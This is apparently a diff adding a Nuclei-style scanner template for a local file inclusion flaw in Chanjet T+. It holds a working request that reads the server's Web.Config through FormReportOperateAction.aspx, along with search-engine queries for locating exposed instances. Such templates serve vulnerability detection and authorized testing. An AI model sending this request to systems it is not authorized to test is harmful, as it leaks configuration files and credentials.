@@ -1,0 +1,34 @@
+id: changjet-tplus-FormReportOperateAction-lfi
+info:
+  name: 畅捷通 T+ FormReportOperateAction.aspx - lfi
+  author: leadlife
+  severity: high
+  description: 
+  reference:
+     - todo
+  metadata:
+    verified: true
+    hunter-query: app.name="畅捷通 T+"
+    fofa-query: icon_hash="-2067519629" || app="畅捷通-TPlus"
+  tags: changjet,lfi,tplus
+
+
+http:
+  - raw:
+      - |
+        GET /tplus/FormReport/FormReportOperateAction.aspx?preload=1&__Action=DownLoadFile&filepath=/Web.Config HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "<?xml"
+          - "SYSTEMDB"
+          - "ProductInfo"
+        condition: and
+
+      - type: status
+        status:
+          - 200
